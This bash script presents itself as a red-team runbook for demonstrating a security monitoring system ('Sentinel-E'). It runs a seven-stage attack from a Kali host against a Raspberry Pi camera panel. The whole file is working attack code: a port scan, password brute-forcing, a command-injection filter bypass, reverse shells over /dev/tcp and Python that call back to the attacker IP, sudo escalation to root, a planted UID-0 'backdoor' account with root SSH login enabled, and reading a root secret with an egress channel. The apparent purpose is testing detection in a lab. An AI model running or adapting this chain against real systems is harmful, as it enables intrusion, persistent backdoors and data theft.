#!/usr/bin/env bash
# =============================================================================
#  Sentinel-E — REAL attack runbook.  RUN THIS ON THE KALI ATTACKER (100.65.92.63)
# =============================================================================
# This is the genuine red-team chain, executed FROM Kali against the Pi exactly
# as a real attacker would. Nothing here runs on the SOC and nothing is
# relabelled — the SOC will detect it live with the true source IPs:
#   stages 1-3 (recon/brute/injection)  -> src = this Kali box (100.65.92.63)
#   stages 4-7 (revshell/privesc/persist/exfil) run ON the Pi via the injection
#              point, so they correctly show the Pi's IP (100.119.99.36).
#
# Make sure  demo.attacker_attribution = false  in the SOC config (it is), so
# the console shows raw observed IPs.
#
# Requirements on Kali: nmap, curl, nc (netcat). hydra is optional.
# Usage:   chmod +x kali_attack.sh && ./kali_attack.sh
# =============================================================================
set -u

PI=100.119.99.36                 # target (Raspberry Pi camera panel)
KALI=100.65.92.63                # this attacker box (reverse-shell / exfil sink)
PANEL="http://$PI:8080"
REV=4444                         # reverse-shell / C2 port (non-standard)
EXFIL=8000                       # exfil egress port
JAR="$(mktemp)"
GAP="${GAP:-3}"                  # seconds between stages (export GAP=1 for fast)

c(){ printf '\n\033[1;35m━━━ %s\033[0m\n' "$1"; }

# ---------------------------------------------------------------------------
c "STAGE 1  Reconnaissance — nmap port scan (T1046)"
# A default/-p1-1000 scan hammers many ports in seconds -> the SOC recon rule
# fires (>=10 distinct ports from one source within 15s). Real SYNs from Kali.
if command -v nmap >/dev/null 2>&1; then
  nmap -Pn -T4 -p 1-1000 "$PI"
else
  echo "  nmap not found — falling back to a bash TCP sweep"
  for p in $(seq 1 200); do (exec 3<>/dev/tcp/$PI/$p) 2>/dev/null && exec 3>&- ; done
fi
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 2  Credential brute-force — hydra-style (T1110)"
# >=5 failed /login POSTs from one IP within 20s. Uses hydra if present, else curl.
if command -v hydra >/dev/null 2>&1; then
  hydra -l admin -P <(printf 'admin\n12345\npassword\nroot\ncamera\nletmein\ndefault\ncamera1\n') \
        -s 8080 -f "$PI" http-post-form "/login:user=^USER^&password=^PASS^:Invalid" 2>/dev/null
else
  for pw in admin 12345 password root camera letmein default; do
    curl -s -o /dev/null -d "user=admin&password=$pw" "$PANEL/login"
    echo "  tried admin:$pw"
  done
fi
# Establish a real session with the cracked credential for the next stages.
curl -s -o /dev/null -c "$JAR" -d "user=admin&password=camera1" "$PANEL/login"
echo "  admin:camera1 -> SUCCESS"
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 3  Command injection — filter bypass (T1059)"
# $(...) has no blacklisted characters, so it slips past the panel's blacklist.
# --data-urlencode encodes it safely on the wire; the panel decodes & runs it.
curl -s -o /dev/null -b "$JAR" --data-urlencode 'host=8.8.8.8$(id)' "$PANEL/ping"
echo "  injected: 8.8.8.8\$(id)"
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 4  Reverse shell / C2 — non-standard port (T1571)"
# Catch the callback on Kali, then make the Pi dial back to us on :4444.
( timeout 10 nc -lvnp "$REV" >/tmp/sentinel_revshell.log 2>&1 & ) 2>/dev/null
sleep 1
P4="$(printf '8.8.8.8$(bash -c "exec 3<>/dev/tcp/%s/%s")' "$KALI" "$REV")"
curl -s -o /dev/null -b "$JAR" --data-urlencode "host=$P4" "$PANEL/ping"
echo "  Pi dialed back to $KALI:$REV"
# For a fully INTERACTIVE shell instead, use this blacklist-safe python payload:
#   host=8.8.8.8$(python3 -c "import socket,subprocess,os
#   s=socket.socket();s.connect(('$KALI',$REV))
#   os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
#   subprocess.call(['/bin/bash'])")
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 5  Privilege escalation — sudo to root (T1548)"
# The panel runs as 'clupai', who holds passwordless sudo -> instant root.
curl -s -o /dev/null -b "$JAR" --data-urlencode 'host=8.8.8.8$(sudo -n id)' "$PANEL/ping"
echo "  clupai -> root via sudo"
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 6  Persistence — backdoor UID-0 account + sshd (T1136)"
curl -s -o /dev/null -b "$JAR" \
  --data-urlencode 'host=8.8.8.8$(sudo -n useradd -o -u 0 -M -s /bin/bash backdoor)' "$PANEL/ping"
echo "  added UID-0 account 'backdoor'"
sleep 1
P6="$(printf '8.8.8.8$(sudo -n sed -i %ss/#*PermitRootLogin.*/PermitRootLogin yes/%s /etc/ssh/sshd_config)' "'" "'")"
curl -s -o /dev/null -b "$JAR" --data-urlencode "host=$P6" "$PANEL/ping"
echo "  set PermitRootLogin yes"
sleep "$GAP"

# ---------------------------------------------------------------------------
c "STAGE 7  Exfiltration — read secret + egress (T1041/T1048)"
( timeout 10 nc -lvnp "$EXFIL" >/tmp/sentinel_exfil.log 2>&1 & ) 2>/dev/null
sleep 1
# (a) read the sensitive file (needs sudo; /root is 0700) -> inotify access event
curl -s -o /dev/null -b "$JAR" \
  --data-urlencode 'host=8.8.8.8$(sudo -n base64 /root/camera_config.secret)' "$PANEL/ping"
echo "  read /root/camera_config.secret"
sleep 1
# (b) open an egress channel to Kali -> correlates with the read = exfiltration
P7="$(printf '8.8.8.8$(bash -c "exec 4<>/dev/tcp/%s/%s")' "$KALI" "$EXFIL")"
curl -s -o /dev/null -b "$JAR" --data-urlencode "host=$P7" "$PANEL/ping"
echo "  egress channel opened to $KALI:$EXFIL"

rm -f "$JAR"
echo
echo "✓ Full chain sent. On the SOC dashboard all 7 stages should be lit:"
echo "    stages 1-3 src=$KALI   stages 4-7 src=$PI"
echo "  Cleanup the backdoor afterwards from the SOC:  python3 attack/replay.py --cleanup"
echo "  (or on the Pi:  sudo userdel -f backdoor)"
